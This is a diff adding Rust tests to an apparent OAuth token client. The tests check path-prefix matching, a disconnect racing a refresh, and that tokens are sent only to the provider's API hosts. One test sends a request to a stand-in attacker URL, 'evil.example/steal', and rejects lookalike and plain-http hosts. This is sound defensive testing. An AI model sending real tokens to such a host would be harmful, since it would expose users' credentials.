@@ -236,6 +236,19 @@ async fn every_page_but_the_callback_needs_a_signed_in_account() {
         .await
         .unwrap();
     assert!(matches!(answer, ConnectAnswer::Page { status: 404, .. }));
+    // The prefix is a whole segment: this path is not under it.
+    let answer = routes
+        .answer(ConnectRequest {
+            path: "/connectionsfake",
+            account: Some("alice"),
+            ..ConnectRequest::default()
+        })
+        .await
+        .unwrap();
+    assert!(
+        matches!(answer, ConnectAnswer::Page { status: 404, .. }),
+        "{answer:?}"
+    );
 }
 
 #[tokio::test]
@@ -371,6 +384,29 @@ async fn a_401_forces_one_refresh_and_one_retry() {
     );
 }
 
+/// The token goes only to the provider's API hosts: a URL a user typed
+/// does not carry it away.
+#[tokio::test]
+async fn the_token_goes_only_to_the_api_hosts() {
+    let (fake, _, _, client, routes) = setup().await;
+    connect(&fake, &routes, "alice").await;
+    let http = client.http("alice", "fake");
+    let err = http
+        .send(http.get("https://evil.example/steal"))
+        .await
+        .unwrap_err();
+    assert!(err.to_string().contains("help:"), "{err}");
+    // The built-in providers know their API hosts.
+    let github = Provider::github("id", "secret");
+    let api = url::Url::parse("https://api.github.com/user").unwrap();
+    assert!(github.check_api_url(&api, false).is_ok());
+    // A host that only ends with the API host's name is another host.
+    let lookalike = url::Url::parse("https://evilapi.github.com/user").unwrap();
+    assert!(github.check_api_url(&lookalike, false).is_err());
+    let plain = url::Url::parse("http://api.github.com/user").unwrap();
+    assert!(github.check_api_url(&plain, false).is_err());
+}
+
 #[tokio::test]
 async fn the_app_client_fetches_a_new_token_after_a_401() {
     let (fake, _, _, client, _) = setup().await;
@@ -399,6 +435,25 @@ async fn a_disconnect_revokes_at_the_provider_and_deletes_the_row() {
     assert_eq!(*fake.revoked.lock().unwrap(), ["rt-2"]);
     assert!(store.get("alice", "fake").await.unwrap().is_none());
     assert!(client.connections("alice").await.unwrap().is_empty());
+}
+
+/// A disconnect while a refresh is in flight waits for it, so the refresh
+/// cannot write the token back after the delete.
+#[tokio::test]
+async fn a_disconnect_during_a_refresh_stays_disconnected() {
+    let (fake, clock, store, client, routes) = setup().await;
+    connect(&fake, &routes, "alice").await;
+    fake.delay_ms.store(150, Ordering::SeqCst);
+    clock.advance(3600);
+    let refreshing = {
+        let client = client.clone();
+        tokio::spawn(async move { client.token("alice", "fake").await })
+    };
+    // Let the refresh reach the provider before the disconnect starts.
+    tokio::time::sleep(std::time::Duration::from_millis(30)).await;
+    assert!(client.disconnect("alice", "fake").await.unwrap());
+    let _ = refreshing.await.unwrap();
+    assert!(store.get("alice", "fake").await.unwrap().is_none());
 }
 
 #[tokio::test]
